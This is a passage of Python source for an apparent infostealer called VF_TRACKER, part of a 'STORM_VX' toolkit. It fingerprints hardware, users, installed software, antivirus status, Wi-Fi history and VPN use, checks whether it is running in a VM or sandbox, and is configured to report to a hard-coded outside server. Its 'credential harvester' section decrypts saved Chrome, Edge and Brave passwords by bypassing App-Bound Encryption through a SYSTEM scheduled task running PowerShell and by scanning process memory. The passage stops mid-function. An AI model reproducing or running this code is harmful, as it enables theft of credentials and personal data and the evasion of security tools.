#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║     VF_TRACKER v3.0 — Advanced System Identity Tracker                   ║
║     Part of the STORM_VX Architecture                                    ║
║                                                                           ║
║  Hardware Fingerprint | User Identity | Environment Detection            ║
║  Deep Network Recon   | Machine ID   | Smart Reporting                   ║
║                                                                           ║
║  FOR AUTHORIZED MONITORING ONLY!                                          ║
╚═══════════════════════════════════════════════════════════════════════════╝

Usage:
  python VF_TRACKER.py                           # Auto-run, save + send
  python VF_TRACKER.py --silent                  # No console output
  python VF_TRACKER.py --no-server               # Local only, no send
  python VF_TRACKER.py --server http://example.com/receive.php
"""

import socket
import uuid
import urllib.request
import urllib.parse
import re
import ssl
import platform
import subprocess
import sys
import os
import json
import time
import hashlib
import argparse
from datetime import datetime

IS_WINDOWS = platform.system() == 'Windows'

# ═══════════════════════════════════════════════════════════════════════════════
# SERVER CONFIGURATION — Must match receive.php token!
# ═══════════════════════════════════════════════════════════════════════════════
VF_SECRET_TOKEN = 'xxx'
DEFAULT_SERVER_URL = 'http://namme.taskinoteam.ir/receive.php'

# ═══════════════════════════════════════════════════════════════════════════════
# UTILITY — Safe WMI/Command Runner
# ═══════════════════════════════════════════════════════════════════════════════

def _wmic(command_parts, timeout=8):
    """Run a wmic or system command safely and return stripped stdout lines."""
    try:
        result = subprocess.run(
            command_parts, capture_output=True, text=True,
            timeout=timeout, encoding='utf-8', errors='replace'
        )
        lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
        # Remove header line if it looks like a wmic header
        if lines and any(hdr in lines[0].lower() for hdr in ['serialnumber', 'uuid', 'processorid', 'name', 'caption', 'product', 'version', 'last', 'fullname', 'description', 'layout', 'domain', 'driverversion', 'status', 'macaddress']):
            lines = lines[1:]
        return lines
    except Exception:
        return []


def _run_cmd(command_str, timeout=8):
    """Run a shell command safely and return stdout string."""
    try:
        result = subprocess.run(
            command_str, shell=True, capture_output=True, text=True,
            timeout=timeout, encoding='utf-8', errors='replace'
        )
        return result.stdout.strip()
    except Exception:
        return ""


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 1: HARDWARE FINGERPRINT
# ═══════════════════════════════════════════════════════════════════════════════

def get_motherboard_serial():
    """[HW-1] Motherboard Serial Number — never changes."""
    lines = _wmic(['wmic', 'baseboard', 'get', 'serialnumber'])
    return lines[0] if lines else "N/A"


def get_bios_uuid():
    """[HW-2] BIOS UUID — unique system identifier."""
    lines = _wmic(['wmic', 'csproduct', 'get', 'UUID'])
    return lines[0] if lines else "N/A"


def get_cpu_processor_id():
    """[HW-3] CPU Processor ID — unique per processor."""
    lines = _wmic(['wmic', 'cpu', 'get', 'processorid'])
    return lines[0] if lines else "N/A"


def get_disk_serial():
    """[HW-4] Disk Drive Serial Number — physical drive serial."""
    lines = _wmic(['wmic', 'diskdrive', 'get', 'serialnumber'])
    return lines[0] if lines else "N/A"


def get_gpu_info():
    """[HW-5] GPU Model and Driver Version."""
    if not IS_WINDOWS:
        # Try lspci on Linux
        try:
            result = subprocess.run(['lspci'], capture_output=True, text=True, timeout=5)
            gpu_lines = [l.strip() for l in result.stdout.split('\n') if 'VGA' in l or '3D' in l or 'Display' in l]
            if gpu_lines:
                return gpu_lines
        except Exception:
            pass
        return ["N/A (Windows WMI / lspci not available)"]
    lines = _wmic(['wmic', 'path', 'win32_videocontroller', 'get', 'name,driverversion'])
    gpus = []
    for line in lines:
        parts = line.split()
        if len(parts) >= 2:
            version = parts[-1]
            name = ' '.join(parts[:-1])
            gpus.append(f"{name} (Driver: {version})")
        elif len(parts) == 1 and parts[0]:
            gpus.append(parts[0])
    return gpus if gpus else ["N/A"]


def get_battery_info():
    """[HW-6] Battery Info (laptops only)."""
    if not IS_WINDOWS:
        return "N/A"
    lines = _wmic(['wmic', 'path', 'win32_battery', 'get', 'name,estimatedchargeremaining'])
    if not lines:
        return "No battery detected (Desktop PC)"
    info = []
    for line in lines:
        if line:
            info.append(line.strip())
    return ' | '.join(info) if info else "No battery detected"


def generate_hwid(motherboard_serial, bios_uuid, cpu_id, disk_serial, mac_addr):
    """[HW-7] Generate unique Hardware ID (SHA256 hash of all HW IDs combined)."""
    raw = f"{motherboard_serial}|{bios_uuid}|{cpu_id}|{disk_serial}|{mac_addr}"
    return hashlib.sha256(raw.encode('utf-8')).hexdigest()


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 2: USER IDENTITY & ENVIRONMENT
# ═══════════════════════════════════════════════════════════════════════════════

def get_windows_username():
    """[ID-1] Current Windows username."""
    try:
        return os.getlogin()
    except Exception:
        try:
            return os.environ.get('USERNAME', os.environ.get('USER', 'Unknown'))
        except Exception:
            return "Unknown"


def get_user_fullname():
    """[ID-2] Full name registered in Windows."""
    if not IS_WINDOWS:
        return "N/A"
    lines = _wmic(['wmic', 'useraccount', 'where', f"name='{get_windows_username()}'", 'get', 'fullname'])
    return lines[0] if lines else "N/A"


def get_last_login():
    """[ID-3] Last login time for current user."""
    if not IS_WINDOWS:
        return "N/A"
    lines = _wmic(['wmic', 'useraccount', 'where', f"name='{get_windows_username()}'", 'get', 'lastlogin'])
    return lines[0] if lines else "N/A"


def get_installed_users():
    """[ID-4] List of all user accounts on the system."""
    if not IS_WINDOWS:
        try:
            result = subprocess.run(['cut', '-d:', '-f1', '/etc/passwd'],
                                    capture_output=True, text=True, timeout=5)
            return [u for u in result.stdout.strip().split('\n') if u and not u.startswith('_')]
        except Exception:
            return ["N/A"]
    lines = _wmic(['wmic', 'useraccount', 'get', 'name'])
    return lines if lines else ["N/A"]


def get_domain_workgroup():
    """[ID-5] Domain or Workgroup name."""
    if not IS_WINDOWS:
        return "N/A"
    domain_lines = _wmic(['wmic', 'computersystem', 'get', 'domain'])
    wg_lines = _wmic(['wmic', 'computersystem', 'get', 'workgroup'])
    domain = domain_lines[0] if domain_lines else "?"
    workgroup = wg_lines[0] if wg_lines else "?"
    return f"Domain: {domain} | Workgroup: {workgroup}"


def get_installed_programs():
    """[ID-6] List of installed programs (name + version).
    Uses Windows Registry instead of WMI — wmic product is extremely slow
    (can take 2+ minutes) because it triggers Windows Installer reconfiguration.
    Registry query takes < 1 second."""
    if not IS_WINDOWS:
        return ["N/A (Windows only)"]
    programs = []
    # Registry paths for installed programs
    reg_paths = [
        r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
        r'HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall',
        r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
    ]
    seen = set()
    for reg_path in reg_paths:
        try:
            result = subprocess.run(
                ['reg', 'query', reg_path],
                capture_output=True, text=True, timeout=5,
                encoding='utf-8', errors='replace'
            )
            if result.returncode != 0:
                continue
            # Each subkey is a program
            for subkey in result.stdout.strip().split('\n'):
                subkey = subkey.strip()
                if not subkey or subkey in seen:
                    continue
                seen.add(subkey)
                try:
                    detail = subprocess.run(
                        ['reg', 'query', subkey, '/v', 'DisplayName'],
                        capture_output=True, text=True, timeout=3,
                        encoding='utf-8', errors='replace'
                    )
                    name_match = re.search(r'DisplayName\s+REG_\w+\s+(.+)', detail.stdout)
                    if not name_match:
                        continue
                    name = name_match.group(1).strip()
                    if not name:
                        continue
                    # Try to get version
                    version = ""
                    try:
                        ver_result = subprocess.run(
                            ['reg', 'query', subkey, '/v', 'DisplayVersion'],
                            capture_output=True, text=True, timeout=3,
                            encoding='utf-8', errors='replace'
                        )
                        ver_match = re.search(r'DisplayVersion\s+REG_\w+\s+(.+)', ver_result.stdout)
                        if ver_match:
                            version = ver_match.group(1).strip()
                    except Exception:
                        pass
                    if version:
                        programs.append(f"{name} (v{version})")
                    else:
                        programs.append(name)
                except Exception:
                    continue
        except Exception:
            continue
    # Sort and limit
    programs.sort()
    return programs[:50] if programs else ["No programs found"]


def get_running_processes():
    """[ID-7] Running processes (top 30 by name)."""
    try:
        if IS_WINDOWS:
            lines = _wmic(['wmic', 'process', 'get', 'name'], timeout=10)
        else:
            result = subprocess.run(['ps', '-eo', 'comm'], capture_output=True,
                                    text=True, timeout=5)
            lines = [l.strip() for l in result.stdout.split('\n') if l.strip()][1:]
        # Deduplicate and sort
        unique = sorted(set(lines))
        return unique[:30] if unique else ["None found"]
    except Exception:
        return ["Error retrieving"]


def get_antivirus_info():
    """[ID-8] Antivirus software detection."""
    if not IS_WINDOWS:
        return ["N/A"]
    try:
        result = subprocess.run(
            ['wmic', '/namespace:\\\\root\\securitycenter2', 'path',
             'antivirusproduct', 'get', 'displayName,productState'],
            capture_output=True, text=True, timeout=8, encoding='utf-8', errors='replace'
        )
        lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
        if len(lines) > 1:
            avs = []
            for line in lines[1:]:
                if line:
                    # Decode productState: 266240 = enabled, 393216 = disabled, 397312 = updating
                    parts = line.split()
                    if len(parts) >= 2:
                        state_hex = parts[-1]
                        try:
                            state_int = int(state_hex)
                            if state_int in [266240, 266256]:
                                status = "Enabled"
                            elif state_int in [393216, 393232]:
                                status = "Disabled"
                            elif state_int in [397312, 397328]:
                                status = "Updating"
                            else:
                                status = f"Unknown({state_hex})"
                            name = ' '.join(parts[:-1])
                            avs.append(f"{name} [{status}]")
                        except ValueError:
                            avs.append(line)
                    else:
                        avs.append(line)
            return avs if avs else ["No antivirus detected"]
        return ["No antivirus detected"]
    except Exception:
        return ["Access denied / Not available"]


def detect_vm_sandbox():
    """[ID-9] Detect Virtual Machine or Sandbox environment."""
    indicators = []
    if not IS_WINDOWS:
        return ["N/A (Windows detection only)"]

    # Check 1: MAC address vendor prefixes for VMs
    mac = get_mac_address().lower()
    vm_mac_prefixes = ['00:0c:29', '00:50:56', '00:05:69',  # VMware
                       '08:00:27', '0a:00:27',               # VirtualBox
                       '00:15:5d',                           # Hyper-V
                       '00:1c:42',                           # Parallels
                       '52:54:00']                           # QEMU/KVM
    for prefix in vm_mac_prefixes:
        if mac.startswith(prefix):
            indicators.append(f"VM MAC detected: {mac} (prefix: {prefix})")
            break

    # Check 2: VM-specific processes
    vm_processes = ['vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe',
                    'vboxservice.exe', 'vboxtray.exe', 'xenservice.exe',
                    'prl_tools.exe', 'prl_cc.exe', 'spoolsv.exe']
    try:
        result = subprocess.run(['wmic', 'process', 'get', 'name'],
                                capture_output=True, text=True, timeout=5,
                                encoding='utf-8', errors='replace')
        running = result.stdout.lower()
        for vp in vm_processes:
            if vp.lower() in running:
                indicators.append(f"VM process: {vp}")
    except Exception:
        pass

    # Check 3: VM-specific registry keys
    try:
        result = subprocess.run(
            ['reg', 'query', 'HKLM\\SOFTWARE\\VMware, Inc.'],
            capture_output=True, text=True, timeout=3)
        if result.returncode == 0:
            indicators.append("VMware registry key found")
    except Exception:
        pass

    try:
        result = subprocess.run(
            ['reg', 'query', 'HKLM\\SOFTWARE\\Oracle\\VirtualBox'],
            capture_output=True, text=True, timeout=3)
        if result.returncode == 0:
            indicators.append("VirtualBox registry key found")
    except Exception:
        pass

    # Check 4: System model via WMI
    model_lines = _wmic(['wmic', 'computersystem', 'get', 'model'])
    if model_lines:
        model = model_lines[0].lower()
        vm_keywords = ['virtual', 'vmware', 'virtualbox', 'qemu', 'kvm',
                       'xen', 'hyper-v', 'parallels']
        for kw in vm_keywords:
            if kw in model:
                indicators.append(f"System model contains: {model_lines[0]}")
                break

    # Check 5: Low RAM check (VMs often have < 4GB)
    ram_lines = _wmic(['wmic', 'OS', 'get', 'TotalVisibleMemorySize'])
    if ram_lines:
        try:
            ram_kb = int(ram_lines[0].split()[0])
            ram_gb = ram_kb / 1024 / 1024
            if ram_gb < 4:
                indicators.append(f"Low RAM: {ram_gb:.1f} GB (possible VM)")
        except Exception:
            pass

    # Check 6: Single CPU core check
    cpu_count = os.cpu_count()
    if cpu_count and cpu_count == 1:
        indicators.append("Single CPU core (possible VM)")

    if not indicators:
        return ["No VM/Sandbox indicators detected (likely physical machine)"]
    return indicators


def get_timezone_locale():
    """[ID-10] Timezone and Locale information."""
    tz_name = time.tzname
    tz_offset = time.strftime('%z')
    try:
        import locale
        try:
            locale_str = locale.getlocale()[0] or "Unknown"
        except Exception:
            locale_str = os.environ.get('LANG', os.environ.get('LC_ALL', 'Unknown'))
    except Exception:
        locale_str = "Unknown"
    return f"TZ: {tz_name[0]} (UTC{tz_offset}) | Locale: {locale_str}"


def get_keyboard_layout():
    """[ID-11] Keyboard layout(s) in use."""
    if not IS_WINDOWS:
        return "N/A"
    lines = _wmic(['wmic', 'keyboard', 'get', 'layout'])
    if lines:
        return ', '.join(lines)
    # Fallback: check registry
    try:
        result = subprocess.run(
            ['reg', 'query', 'HKCU\\Keyboard Layout\\Preload'],
            capture_output=True, text=True, timeout=3)
        if result.stdout:
            layouts = re.findall(r'REG_SZ\s+(\S+)', result.stdout)
            if layouts:
                return ', '.join(layouts)
    except Exception:
        pass
    return "Unknown"


def detect_vpn_proxy():
    """[ID-12] Detect VPN or Proxy usage."""
    indicators = []

    if IS_WINDOWS:
        # Check for VPN adapter names
        try:
            result = subprocess.run(['wmic', 'nic', 'get', 'name,netenabled'],
                                    capture_output=True, text=True, timeout=5,
                                    encoding='utf-8', errors='replace')
            vpn_keywords = ['vpn', 'tunnel', 'tap', 'tun', 'wireguard',
                            'nordvpn', 'expressvpn', 'proton', 'mullvad',
                            'cyberghost', 'surfshark', 'hideme', 'openvpn']
            for line in result.stdout.split('\n'):
                line_lower = line.lower()
                for kw in vpn_keywords:
                    if kw in line_lower and 'true' in line.lower():
                        indicators.append(f"VPN adapter: {line.strip()}")
                        break
        except Exception:
            pass

        # Check for proxy settings
        try:
            result = subprocess.run(
                ['reg', 'query',
                 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
                 '/v', 'ProxyEnable'],
                capture_output=True, text=True, timeout=3)
            if '0x1' in result.stdout:
                indicators.append("System proxy: ENABLED")
                # Get proxy server
                result2 = subprocess.run(
                    ['reg', 'query',
                     'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
                     '/v', 'ProxyServer'],
                    capture_output=True, text=True, timeout=3)
                proxy_match = re.search(r'REG_SZ\s+(.+)', result2.stdout)
                if proxy_match:
                    indicators.append(f"Proxy server: {proxy_match.group(1).strip()}")
            elif '0x0' in result.stdout:
                indicators.append("System proxy: Disabled")
        except Exception:
            pass

    else:
        # Linux: check for tun/tap interfaces
        try:
            result = subprocess.run(['ip', 'link', 'show'], capture_output=True,
                                    text=True, timeout=5)
            if 'tun' in result.stdout.lower() or 'tap' in result.stdout.lower():
                indicators.append("VPN interface (tun/tap) detected")
        except Exception:
            pass

        # Check environment for proxy
        for var in ['http_proxy', 'https_proxy', 'HTTP_PROXY', 'HTTPS_PROXY']:
            val = os.environ.get(var)
            if val:
                indicators.append(f"Proxy env: {var}={val}")

    if not indicators:
        return ["No VPN/Proxy detected"]
    return indicators


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 3: DEEP NETWORK RECON
# ═══════════════════════════════════════════════════════════════════════════════

def get_current_wifi_info():
    """[NET-1,2] Current WiFi SSID and Signal Strength."""
    if not IS_WINDOWS:
        return "N/A", "N/A"
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'],
                                capture_output=True, text=True, timeout=5,
                                encoding='utf-8', errors='replace')
        ssid_match = re.search(r'(?:SSID|Profile)\s*:\s*(.+)', result.stdout)
        signal_match = re.search(r'Signal\s*:\s*(.+)', result.stdout)

        ssid = ssid_match.group(1).strip() if ssid_match else "Not connected"
        signal = signal_match.group(1).strip() if signal_match else "N/A"
        return ssid, signal
    except Exception:
        return "Error", "Error"


def get_all_wifi_profiles():
    """[NET-3] All previously connected WiFi networks — movement history."""
    if not IS_WINDOWS:
        return ["N/A (Windows only)"]
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'],
                                capture_output=True, text=True, timeout=5,
                                encoding='utf-8', errors='replace')
        profiles = re.findall(r':\s+(.+)\s*$', result.stdout, re.MULTILINE)
        return [p.strip() for p in profiles if p.strip()] if profiles else ["No WiFi profiles"]
    except Exception:
        return ["Error retrieving"]


def get_dns_servers():
    """[NET-4] DNS server addresses."""
    if not IS_WINDOWS:
        try:
            result = subprocess.run(['cat', '/etc/resolv.conf'],
                                    capture_output=True, text=True, timeout=5)
            dns_lines = []
            for l in result.stdout.split('\n'):
                if l.strip().startswith('nameserver'):
                    ip = l.strip().replace('nameserver', '').strip()
                    if ip:
                        dns_lines.append(ip)
            return dns_lines if dns_lines else ["Not found"]
        except Exception:
            return ["Error"]
    try:
        result = subprocess.run(['ipconfig', '/all'],
                                capture_output=True, text=True, timeout=5,
                                encoding='utf-8', errors='replace')
        dns_matches = re.findall(r'DNS Servers?\s*\.+\s*:\s*([\d\.]+)', result.stdout)
        return dns_matches if dns_matches else ["Not found"]
    except Exception:
        return ["Error"]


def get_dhcp_server():
    """[NET-5] DHCP server address."""
    if not IS_WINDOWS:
        return "N/A"
    try:
        result = subprocess.run(['ipconfig', '/all'],
                                capture_output=True, text=True, timeout=5,
                                encoding='utf-8', errors='replace')
        match = re.search(r'DHCP Server\s*\.+\s*:\s*([\d\.]+)', result.stdout)
        return match.group(1) if match else "Not found"
    except Exception:
        return "Error"


def get_all_network_adapters():
    """[NET-6] All network adapters with details."""
    if not IS_WINDOWS:
        try:
            result = subprocess.run(['ip', 'link', 'show'],
                                    capture_output=True, text=True, timeout=5)
            return [l.strip() for l in result.stdout.split('\n') if l.strip()][:10]
        except Exception:
            return ["Error"]
    try:
        result = subprocess.run(
            ['wmic', 'nic', 'get', 'name,macaddress,netenabled,speed'],
            capture_output=True, text=True, timeout=5,
            encoding='utf-8', errors='replace'
        )
        lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
        if len(lines) > 1:
            adapters = []
            for line in lines[1:]:
                if line:
                    adapters.append(line)
            return adapters if adapters else ["None found"]
        return ["None found"]
    except Exception:
        return ["Error retrieving"]


def get_proxy_settings():
    """[NET-8] Detailed proxy settings."""
    if not IS_WINDOWS:
        # Check env vars
        proxies = []
        for var in ['http_proxy', 'https_proxy', 'ftp_proxy', 'no_proxy']:
            val = os.environ.get(var, os.environ.get(var.upper()))
            if val:
                proxies.append(f"{var}={val}")
        return proxies if proxies else ["No proxy settings"]

    settings = []
    try:
        # WinHTTP proxy
        result = subprocess.run(['netsh', 'winhttp', 'show', 'proxy'],
                                capture_output=True, text=True, timeout=3,
                                encoding='utf-8', errors='replace')
        if 'Direct access' in result.stdout:
            settings.append("WinHTTP: Direct (no proxy)")
        else:
            proxy_match = re.search(r'Proxy Server\s*:\s*(.+)', result.stdout)
            if proxy_match:
                settings.append(f"WinHTTP Proxy: {proxy_match.group(1).strip()}")
    except Exception:
        pass

    try:
        # IE/System proxy
        result = subprocess.run(
            ['reg', 'query',
             'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
             '/v', 'ProxyEnable'],
            capture_output=True, text=True, timeout=3)
        if '0x1' in result.stdout:
            result2 = subprocess.run(
                ['reg', 'query',
                 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
                 '/v', 'ProxyServer'],
                capture_output=True, text=True, timeout=3)
            proxy_match = re.search(r'REG_SZ\s+(.+)', result2.stdout)
            if proxy_match:
                settings.append(f"System Proxy: {proxy_match.group(1).strip()}")
        else:
            settings.append("System Proxy: Disabled")
    except Exception:
        pass

    return settings if settings else ["No proxy settings found"]




# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 5: CREDENTIAL HARVESTER v4 — Browser saved passwords extraction
# Supports: Chrome (v10/v11/v20), Firefox (NSS), Edge, Brave
# Decryption: DPAPI (win32crypt + ctypes), AES-256-GCM (pycryptodome + cryptography)
# v4 fixes: Chrome v20/App-Bound Encryption, scan ALL profiles, diagnostic output
# ═══════════════════════════════════════════════════════════════════════════════

# Key cache + diagnostic info
_chrome_key_cache = {}
_chrome_diag = {}  # Store diagnostic info per browser

def _decrypt_app_bound_via_ielevator(encrypted_key):
    """Decrypt Chrome App-Bound key via IElevator COM + SYSTEM DPAPI.

    Chrome 127+ uses App-Bound Encryption. The key is DPAPI-encrypted
    by the Chrome elevation service (running as SYSTEM) with the
    chrome.exe path as entropy (UTF-16LE).

    Strategy (REORDERED for correctness):
    1. IElevator COM interface via PowerShell (THE PROPER WAY for Chrome 127+)
    2. DPAPI as SYSTEM via scheduled task with chrome.exe entropy
    3. DPAPI with chrome.exe entropy from current user (fallback)
    4. Chrome process memory extraction (last resort)

    v7 FIX: IElevator COM is tried FIRST because it's the official Chrome API.
    DPAPI-from-current-user was returning wrong keys because app-bound keys
    are encrypted under SYSTEM profile, not the current user.

    Requires admin privileges.
    Returns: (decrypted_key_bytes, strategy_name) or (None, None)
    """
    if not IS_WINDOWS:
        return (None, None)

    # Strip APPB prefix if present
    key_data = encrypted_key
    if isinstance(key_data, bytes) and len(key_data) >= 4:
        try:
            prefix = key_data[:4].decode('ascii', errors='replace')
            if prefix == 'APPB':
                key_data = key_data[4:]
        except Exception:
            pass

    # Find Chrome/Edge/Brave installation paths for DPAPI entropy
    entropy_paths = []
    browser_search = [
        (os.path.join(os.environ.get('PROGRAMFILES', 'C:\\Program Files'), 'Google', 'Chrome', 'Application', 'chrome.exe'), 'chrome'),
        (os.path.join(os.environ.get('PROGRAMFILES(X86)', 'C:\\Program Files (x86)'), 'Google', 'Chrome', 'Application', 'chrome.exe'), 'chrome'),
        (os.path.join(os.environ.get('PROGRAMFILES', 'C:\\Program Files'), 'Microsoft', 'Edge', 'Application', 'msedge.exe'), 'edge'),
        (os.path.join(os.environ.get('PROGRAMFILES(X86)', 'C:\\Program Files (x86)'), 'Microsoft', 'Edge', 'Application', 'msedge.exe'), 'edge'),
        (os.path.join(os.environ.get('PROGRAMFILES', 'C:\\Program Files'), 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'), 'brave'),
        (os.path.join(os.environ.get('PROGRAMFILES(X86)', 'C:\\Program Files (x86)'), 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'), 'brave'),
    ]
    for path, _ in browser_search:
        if os.path.exists(path):
            entropy_paths.append(path)

    # Also try registry for Chrome path
    if not any('chrome' in p.lower() for p in entropy_paths):
        try:
            result = subprocess.run(
                ['reg', 'query', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe', '/ve'],
                capture_output=True, text=True, timeout=3
            )
            match = re.search(r'REG_SZ\s+(.+)', result.stdout)
            if match:
                reg_path = match.group(1).strip().strip('"')
                if os.path.exists(reg_path) and reg_path not in entropy_paths:
                    entropy_paths.append(reg_path)
        except Exception:
            pass

    def _validate_key(key_bytes, strategy):
        """Validate that the extracted key looks correct for AES-256-GCM."""
        if key_bytes is None:
            return (None, None)
        # AES-256 key MUST be exactly 32 bytes
        if len(key_bytes) != 32:
            _chrome_diag.setdefault('_key_validation', {})[strategy] = f'wrong_len={len(key_bytes)}'
            return (None, None)
        # Key should not be all zeros
        if key_bytes == b'\x00' * 32:
            _chrome_diag.setdefault('_key_validation', {})[strategy] = 'all_zeros'
            return (None, None)
        # v8: Entropy check — a real AES-256 key should have reasonable byte diversity.
        # A pointer value or garbage data often has many zero bytes or repeated patterns.
        unique_bytes = len(set(key_bytes))
        if unique_bytes < 8:
            _chrome_diag.setdefault('_key_validation', {})[strategy] = f'low_entropy_unique={unique_bytes}'
            return (None, None)
        # Check for pointer-like patterns (many 0x00 bytes in upper half on 64-bit)
        zero_count = key_bytes.count(b'\x00')
        if zero_count > 20:
            _chrome_diag.setdefault('_key_validation', {})[strategy] = f'too_many_zeros={zero_count}'
            return (None, None)
        return (key_bytes, strategy)

    # --- Strategy 1: IElevator COM interface via PowerShell (THE PROPER WAY) ---
    result = _call_ielevator_com_ps(key_data)
    valid = _validate_key(result, 'ielevator_com')
    if valid[0] is not None:
        return valid

    # --- Strategy 2: DPAPI as SYSTEM via scheduled task ---
    result = _dpapi_decrypt_as_system(key_data, entropy_paths)
    valid = _validate_key(result, 'dpapi_system')
    if valid[0] is not None:
        return valid

    # --- Strategy 3: DPAPI with chrome.exe entropy from current user ---
    for entropy_path in entropy_paths:
        result = _dpapi_decrypt_with_entropy(key_data, entropy_path)
        valid = _validate_key(result, f'dpapi_entropy')
        if valid[0] is not None:
            return valid

    # Also try without entropy
    result = _dpapi_decrypt_ctypes(key_data)
    valid = _validate_key(result, 'dpapi_no_entropy')
    if valid[0] is not None:
        return valid

    # --- Strategy 4: Chrome process memory ---
    result = _extract_key_from_chrome_memory()
    valid = _validate_key(result, 'memory_scan')
    if valid[0] is not None:
        return valid

    # All methods failed
    return (None, None)


def _dpapi_decrypt_with_entropy(data, entropy_str):
    """Decrypt data using Windows DPAPI with an entropy string.

    Chrome uses the chrome.exe path as entropy for app-bound encryption.
    The path is encoded as UTF-16LE (Windows native Unicode).
    """
    if not IS_WINDOWS:
        return None
    try:
        import ctypes
        import ctypes.wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [
                ('cbData', ctypes.wintypes.DWORD),
                ('pbData', ctypes.POINTER(ctypes.c_ubyte))
            ]

        p_data = ctypes.create_string_buffer(data, len(data))
        blob_in = DATA_BLOB(len(data), ctypes.cast(p_data, ctypes.POINTER(ctypes.c_ubyte)))

        entropy_bytes = entropy_str.encode('utf-16-le')
        p_entropy = ctypes.create_string_buffer(entropy_bytes, len(entropy_bytes))
        blob_entropy = DATA_BLOB(len(entropy_bytes), ctypes.cast(p_entropy, ctypes.POINTER(ctypes.c_ubyte)))

        blob_out = DATA_BLOB()

        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, ctypes.byref(blob_entropy),
            None, None, 0, ctypes.byref(blob_out)
        ):
            result = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return result

        blob_out = DATA_BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, ctypes.byref(blob_entropy),
            None, None, 0x1, ctypes.byref(blob_out)
        ):
            result = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return result

    except Exception:
        pass
    return None


def _dpapi_decrypt_as_system(key_data, entropy_paths):
    """Run DPAPI decryption as NT AUTHORITY\\SYSTEM via scheduled task.

    The Chrome elevation service encrypts the app-bound key using
    DPAPI under the SYSTEM profile. To decrypt, we need to run
    CryptUnprotectData as SYSTEM, which has access to the SYSTEM
    DPAPI master key.
    """
    if not IS_WINDOWS:
        return None

    import tempfile

    temp_dir = tempfile.gettempdir()
    enc_key_file = os.path.join(temp_dir, 'vf_enc_key.txt')
    dec_key_file = os.path.join(temp_dir, 'vf_dec_key.txt')
    ps_script_file = os.path.join(temp_dir, 'vf_decrypt.ps1')
    task_name = 'VF_ChromeKeyDecrypt'

    try:
        key_b64 = base64.b64encode(key_data).decode('ascii')
        with open(enc_key_file, 'w') as f:
            f.write(key_b64)

        entropy_ps_list = '@(' + ','.join(f'"{p}"' for p in entropy_paths) + ')'

        ps_script = (
            '$key_b64 = Get-Content "' + enc_key_file + '" -Raw\n'
            '$key_bytes = [Convert]::FromBase64String($key_b64.Trim())\n'
            'Add-Type -AssemblyName System.Security\n'
            '$entropy_paths = ' + entropy_ps_list + '\n'
            '$result = $null\n'
            'foreach ($chrome_path in $entropy_paths) {\n'
            '    $entropy = [System.Text.Encoding]::Unicode.GetBytes($chrome_path)\n'
            '    try {\n'
            '        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($key_bytes, $entropy, \'CurrentUser\')\n'
            '        $result = [Convert]::ToBase64String($decrypted)\n'
            '        break\n'
            '    } catch {}\n'
            '}\n'
            'if (-not $result) {\n'
            '    try {\n'
            '        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($key_bytes, $null, \'CurrentUser\')\n'
            '        $result = [Convert]::ToBase64String($decrypted)\n'
            '    } catch {}\n'
            '}\n'
            'if (-not $result) {\n'
            '    foreach ($chrome_path in $entropy_paths) {\n'
            '        $entropy = [System.Text.Encoding]::Unicode.GetBytes($chrome_path)\n'
            '        try {\n'
            '            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($key_bytes, $entropy, \'LocalMachine\')\n'
            '            $result = [Convert]::ToBase64String($decrypted)\n'
            '            break\n'
            '        } catch {}\n'
            '    }\n'
            '}\n'
            'if (-not $result) {\n'
            '    try {\n'
            '        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($key_bytes, $null, \'LocalMachine\')\n'
            '        $result = [Convert]::ToBase64String($decrypted)\n'
            '    } catch {}\n'
            '}\n'
            'if ($result) {\n'
            '    $result | Out-File "' + dec_key_file + '" -Encoding ASCII\n'
            '} else {\n'
            '    "FAILED" | Out-File "' + dec_key_file + '" -Encoding ASCII\n'
            '}\n'
        )
        with open(ps_script_file, 'w', encoding='utf-8') as f:
            f.write(ps_script)

        subprocess.run(['schtasks', '/delete', '/tn', task_name, '/f'],
                      capture_output=True, timeout=5)

        if os.path.exists(dec_key_file):
            try:
                os.remove(dec_key_file)
            except Exception:
                pass

        create_result = subprocess.run([
            'schtasks', '/create', '/tn', task_name, '/ru', 'SYSTEM',
            '/sc', 'once', '/st', '00:00', '/f',
            '/tr', f'powershell -ExecutionPolicy Bypass -NoProfile -NonInteractive -File "{ps_script_file}"'
        ], capture_output=True, timeout=10)

        if create_result.returncode != 0:
            return None

        subprocess.run(['schtasks', '/run', '/tn', task_name],
                      capture_output=True, timeout=10)

        for _ in range(15):
            time.sleep(1)
            if os.path.exists(dec_key_file):
